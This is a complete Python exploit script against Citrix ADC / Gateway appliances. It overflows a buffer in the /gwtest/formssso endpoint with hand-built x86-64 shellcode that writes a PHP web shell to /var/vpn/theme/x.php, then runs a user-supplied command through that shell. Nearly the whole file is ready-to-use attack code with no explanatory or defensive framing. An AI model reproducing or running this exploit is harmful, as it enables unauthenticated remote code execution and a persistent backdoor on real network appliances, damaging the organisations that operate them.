#!/usr/bin/env python3

import socket
import ssl
import sys
import requests
import urllib.parse
import urllib3
import argparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument('--target', help='The Citrix ADC / Gateway target, excluding the protocol (e.g. 192.168.1.200)')
parser.add_argument('--cmd', help='The command to run after exploitation (e.g. uname -a)')
args = parser.parse_args()

if args.target is None:
    print('Target must be provided (e.g. --target 192.168.1.200)')
    sys.exit(0)

if args.cmd is None:
    print('Command must be provided (e.g. --cmd "uname -a")')
    sys.exit(0)

hostname = args.target
command = args.cmd
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def tweaked_url_encode(payload):
    bytes_to_encode = b'\x00\x30\x90'
    encoded = bytearray(b'')
    for byte in payload:
        if byte in bytes_to_encode:
            encoded.extend('%{:02X}'.format(byte).encode('utf-8'))
        else:
            encoded.append(byte)
    return bytes(encoded)

shellcode  = b''
shellcode += b'/var/vpn/theme/x.php\x00'       # 21 bytes
shellcode += b'AAAAAAAAAAAAA'                  # 13 bytes
shellcode += b'<?php+system($_GET[0]);+?>\x00' # 27 bytes

# open syscall
shellcode += b'\x48\x89\xe7'                   # mov rdi, rsp 
shellcode += b'\x48\x81\xef\xb0\x00\x00\x00'   # sub rdi, 0xb0
shellcode += b'\xbe\x01\x02\x00\x00'           # mov esi, 0x201
shellcode += b'\xba\xff\x01\x00\x00'           # mov edx, 0x1ff
shellcode += b'\xb8\x05\x00\x00\x00'           # mov eax, 0x5
shellcode += b'\x0f\x05'                       # syscall

# write syscall
shellcode += b'\x48\x89\xc7'                   # mov rdi, rax
shellcode += b'\x48\x89\xe6'                   # mov rsi, rsp
shellcode += b'\x48\x81\xee\x8e\x00\x00\x00'   # sub rsi, 0x8e
shellcode += b'\xba\x1a\x00\x00\x00'           # mov edx, 0x1a
shellcode += b'\xb8\x04\x00\x00\x00'           # mov eax, 0x4
shellcode += b'\x0f\x05'                       # syscall

# close syscall
shellcode += b'\xb8\x06\x00\x00\x00'           # mov rax, 0x6
shellcode += b'\x0f\x05'                       # syscall

# cleanup
shellcode += b'\x48\x83\xC4\x30'               # add rsp, 0x30
shellcode += b'\x5d'                           # pop rbp
shellcode += b'\xc3'                           # ret

shellcode_encoded = tweaked_url_encode(shellcode)

return_address = b'\x6d\xc1\xff\xff\xff\x7f\x00\x00'
return_address_encoded = tweaked_url_encode(return_address)

padding = b'A' * (168 - len(shellcode))
payload = shellcode_encoded + padding + return_address_encoded

request  = b''
request += b'GET /gwtest/formssso?event=start&target='
request += payload
request += f' HTTP/1.1\r\nHost: {hostname}\r\n\r\n'.encode('utf-8')

with socket.create_connection((hostname, 443)) as sock:
    with context.wrap_socket(sock) as ssock:
        print('[+] Connected: ' + ssock.version())
        ssock.send(request)
        print('[+] Sent payload')
        print(f'[+] Running "{command}"')
        r = requests.get(f'https://{hostname}/vpn/theme/x.php?0={command}', verify=False)
        print(f'[+] {r.text}')
